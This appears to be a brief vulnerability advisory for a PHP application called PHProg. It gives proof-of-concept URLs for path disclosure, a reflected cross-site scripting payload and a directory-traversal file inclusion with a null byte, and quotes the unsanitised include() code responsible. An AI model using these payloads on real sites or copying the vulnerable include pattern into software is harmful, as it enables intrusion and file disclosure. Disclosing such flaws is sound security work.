@@ -1,0 +1,11 @@
+Path disclosure vulnerability: 
+http://www.example.com/PHProg/?id=1&album=input
+
+Cross Site Scripting vulnerability: 
+http://www.example.com/PHProg/?id=1&album=<script>alert('input')</script>
+
+File inclusion vulnerability:
+http://www.example.com/PHProg/index.php?lang=../../../../../../BOOT.INI%00
+
+Ligne 59        =>              $lang=$_GET['lang'];
+Ligne 61        =>              include("lang/$lang.php");
